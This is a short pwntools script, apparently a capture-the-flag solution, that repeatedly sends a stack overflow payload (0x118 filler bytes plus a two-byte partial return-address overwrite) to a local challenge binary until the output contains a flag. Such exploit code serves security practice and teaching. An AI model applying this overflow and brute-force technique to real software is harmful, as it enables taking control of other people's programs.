#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1

while True:
    if local:
        p = process('./pwn2')
        elf = ELF('./pwn2')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        pass

    #gdb.attach(p)

    '\x6E\x15 -> \x09\x12'

    p.recvuntil(b'Try overflow me, again!\n')
    payload = b'A' * 0x118 + b'\x09\x82'
    p.send(payload)
    if b'flag' in p.recv():
        p.close()
        break
    else:
        p.close()
        continue

